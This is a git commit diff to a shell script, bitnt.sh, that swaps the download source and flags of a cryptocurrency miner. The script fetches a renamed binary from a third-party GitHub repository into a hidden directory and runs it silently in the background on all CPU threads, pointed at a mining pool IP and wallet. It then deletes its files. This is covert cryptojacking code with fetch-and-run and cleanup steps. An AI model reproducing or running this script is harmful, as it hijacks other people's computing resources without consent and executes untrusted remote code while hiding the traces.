b434e2de578d9fff407a55f8f8bbf40e77473a64
loeto21 <161197201+loeto21@users.noreply.github.com>
2024-03-09 21:39:00 -0800

    Update bitnt.sh

--- bitnt.sh
+++ bitnt.sh
@@ -2,9 +2,9 @@
 set -x
 apt-get update ; apt-get install -y wget curl sudo
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI > /dev/null 2>&1
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner > /dev/null 2>&1
 chmod u+x sgr1
-./sgr1 --algorithm aurum --pool 64.23.198.64:443 --wallet bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur --password webpassword=x --keepalive true --cpu-threads $(nproc --all) > /dev/null 2>&1 &
+./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 rm -rvf *
 cd ~/
